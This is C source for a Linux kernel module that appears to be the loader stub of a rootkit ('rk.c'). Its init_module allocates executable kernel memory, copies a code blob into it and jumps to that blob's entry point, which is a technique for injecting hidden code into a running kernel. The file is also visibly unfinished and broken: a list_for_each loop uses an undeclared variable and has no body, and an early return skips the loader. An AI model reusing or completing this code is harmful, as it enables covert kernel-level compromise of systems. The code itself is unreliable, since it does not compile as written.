#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/vmalloc.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/binfmts.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/spinlock.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/termios.h>

/* patched by rk.c:insmod() */
unsigned long marker        = 0xdeadb4b0;
unsigned long kstart        = -1;
unsigned long klen          = -1;
unsigned long kenter        = -1;
int (*reloc)(unsigned char *, void *) = (void *)-1;
unsigned char *rkmem = (void *)-1;

void
pstask()
{
	struct task_struct *p;
	for_each_process(p) {
		if (p->pid == 2798) {
			printk("pid: %d name: %s\n", p->pid, p->comm);
			list_for_each(list, &p->children)
		}
	}
}

int
init_module(void)
{
	int (*kinit)(void);
	int i;
pstask();return 0;
	rkmem = __vmalloc(8192*3, GFP_KERNEL, PAGE_KERNEL_EXEC);
	printk("rkmem: %p\n", rkmem);
	for (i = 0; i < klen; i++) {
		*(rkmem+i) = *(unsigned char *)(kstart+i);
	}
//	ret = copy_from_user(rkmem, (void *)kstart, klen);
//	reloc(rkmem, &printk);
	kinit = (void *)(kenter-kstart);
	kinit = (void *)rkmem+(unsigned long)kinit;
	return kinit();
}

void cleanup_module(void) {}

MODULE_LICENSE("GPL");
